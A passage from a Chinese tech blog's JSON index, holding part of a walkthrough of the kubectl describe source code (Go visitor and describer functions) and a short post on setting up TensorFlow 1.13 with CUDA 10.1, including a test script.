中注册了从获取到的数据结构中转化出通用数据的方法。\n\n```\n// inputs are consumed by the first execution - use Infos() or Object() on the Result to capture a list\n// for further iteration.\nfunc (b *Builder) Do() *Result {\n    r := b.visitorResult()\n    //... \n    \n    helpers := []VisitorFunc{}\n    //注册获取数据前的动作\n    if b.defaultNamespace {\n        helpers = append(helpers, SetNamespace(b.namespace))\n    }\n    if b.requireNamespace {\n        helpers = append(helpers, RequireNamespace(b.namespace))\n    }\n    helpers = append(helpers, FilterNamespace)\n    if b.requireObject {\n        //注册从Apiserver获取数据的方法\n        helpers = append(helpers, RetrieveLazy) \n    }\n    //注册从返回数据中提取信息的方法\n    r.visitor = NewDecoratedVisitor(r.visitor, helpers...)\n    if b.continueOnError {\n        r.visitor = ContinueOnErrorVisitor{r.visitor}\n    }\n    return r\n}\n```\n\n```\n// RetrieveLazy updates the object if it has not been loaded yet.\nfunc RetrieveLazy(info *Info, err error) error {\n    if err != nil {\n        return err\n    }\n    if info.Object == nil {\n        return info.Get()     //从Apiserver获取数据\n    }\n    return nil\n}\n```\n\n而 NewDecoratedVisitor 方法注册了数据处理的关键函数 Visit， 这个函数可以使用户可以将来自Apiserver的数据转化为通用数据集合。\n\n```\n// NewDecoratedVisitor will create a visitor that invokes the provided visitor functions before\n// the user supplied visitor function is invoked, giving them the opportunity to mutate the Info\n// object or terminate early with an error.\nfunc NewDecoratedVisitor(v Visitor, fn ...VisitorFunc) Visitor {\n    if len(fn) == 0 {\n        return v\n    }\n    return DecoratedVisitor{v, fn}\n}\n\n// Visit implements Visitor\nfunc (v DecoratedVisitor) Visit(fn VisitorFunc) error {\n    return v.visitor.Visit(func(info *Info, err error) error {\n        if err != nil {\n            return err\n        }\n        for i := range v.decorators {\n            if err := v.decorators[i](info, nil); err != nil {\n                return err\n            }\n        }\n        return fn(info, nil)\n    })\n}\n```\n\n打印提取到的数据主要是调用注册的describe方法，会根据用户的请求如下获取对应的describe\n\n```\ndescriber, err := f.Describer(mapping)\n```\n\nDescribe 集合中注册了 对K8s各种数据的打印方法(针对visit转化后的通用数据)\n\n```\nfunc init() {\n    d := &Describers{}\n    err := d.Add(\n        describeLimitRange,\n        describeQuota,\n        describePod,\n        describeService,\n        describeReplicationController,\n        describeDaemonSet,\n        describeNode,              //打印节点\n        describeNamespace,\n    )\n    if err != nil {\n        glog.Fatalf(\"Cannot register describers: %v\", err)\n    }\n    DefaultObjectDescriber = d\n}\n```\n\n使用获取到的对应的Describe作打印\n\n```\n//遍历整理出的返回信息\nfor _, info := range infos {\n        // 执行打印操作\n        s, err := describer.Describe(info.Namespace, info.Name, *describerSettings)\n        // ...\n    }\n```\n\n\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"tensorflow环境安装","url":"/2017/05/26/tensorflow安装小结/","content":"\n## 深度学习环境 tensorflow安装\n\n### 环境准备\n\n需要支持RTX2080ti显卡，最好有11g现存。\n\n本人使用CUDA10.1，cudnn 10.1适配。\n\npython3.7 pycharm安装。\n\nanaconde3 安装多次使用了 anaconde3 4.4 版本安装上了。\n\n之后安装tensorflow，安装版本1.13版本的支持10.1的版本的tensorflow.\n\n### 运行测试\n\n```python\n# -*- coding: utf-8 -*-\n\nimport tensorflow as tf\n\n# 创建一个变量, 初始化为标量 0.\nstate = tf.Variable(0, name=\"counter\")\n\n# 创建一个 op, 其作用是使 state 增加 1\none = tf.constant(1)\nnew_value = tf.add(state, one)\nupdate = tf.assign(state, new_value)\n\n# 启动图后, 变量必须先经过`初始化` (init) op 初始化,\n# 首先必须增加一个`初始化` op 到图中.\n# initialize_all_variables 警告换成 global_variables_initializer\ninit_op = tf.global_variables_initializer()\n\n# 启动图, 运行 op\nwith tf.Session() as sess:\n    # 运行 'init' op\n    sess.run(init_op)\n    # 打印 'state' 的初始值\n    print(sess.run(state))\n    # 运行 op, 更新 'state', 并打印 'state'\n    for i in range(3):\n        sess.run(update)\n        print(sess.run(state))\n```\n\n运行成功则正常。\n\n开启旅程啦~~\n","tags":["深度学习"],"categories":["深度学习"]}]